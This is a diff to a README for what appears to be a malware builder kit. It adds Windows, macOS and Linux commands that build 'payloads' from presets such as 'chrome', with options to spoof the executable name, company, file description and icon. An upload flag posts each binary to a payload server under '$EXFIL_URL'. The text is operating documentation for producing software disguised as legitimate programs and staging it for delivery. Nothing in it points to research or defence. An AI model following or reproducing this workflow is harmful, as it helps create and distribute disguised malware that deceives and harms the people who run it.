@@ -22,25 +22,41 @@ deploy/
 
 ## Building payloads
 
-### Option A — Local Windows build
+### Option A — Local build
 
-Run on your Windows machine from the repo root. URL/key are auto-read from `deploy/config`.
+All three build scripts read `DOMAIN` and `BB_API_KEY` from `deploy/config` automatically.
 
+**Windows** (PowerShell, from repo root):
 ```powershell
 .\build_windows.ps1 -Preset chrome
+.\build_windows.ps1 -Preset chrome -Upload    # build + upload to payload server
+```
+Params: `-Preset`, `-ExeName`, `-Company`, `-FileDesc`, `-IconFile`, `-Upload`
+
+**macOS** (run on a Mac):
+```bash
+./build_mac.sh --preset chrome
+./build_mac.sh --preset chrome --upload       # build + upload to payload server
 ```
 
-Common params: `-Preset`, `-ExeName`, `-Company`, `-FileDesc`, `-IconFile` (optional local path).
-Output goes to `payloads/`. The `/payloads` page has a command generator to build the right command.
+**Linux** (run on Linux, requires sudo):
+```bash
+sudo ./build_linux.sh --preset chrome
+sudo ./build_linux.sh --preset chrome --upload  # build + upload to payload server
+```
+
+All scripts accept `--upload` / `-Upload` to POST the built binary to `$EXFIL_URL/payloads` after building. The payload server returns HTTP 303 on success (post-redirect-get pattern) — scripts treat any 2xx/3xx as success.
+
+The `/payloads` page has a command generator with Windows/macOS/Linux tabs and an "Upload after build" checkbox.
 
 Or run the Python agent to poll the server queue and build automatically:
 ```
 python build_agent.py
 ```
 
-### Option B — Manual exe upload
+### Option B — Manual upload
 
-Upload any pre-built exe via `/payloads` → Manual Upload section.
+Upload any pre-built binary via `/payloads` → Manual Upload section.
 
 ## Deploying the server
 
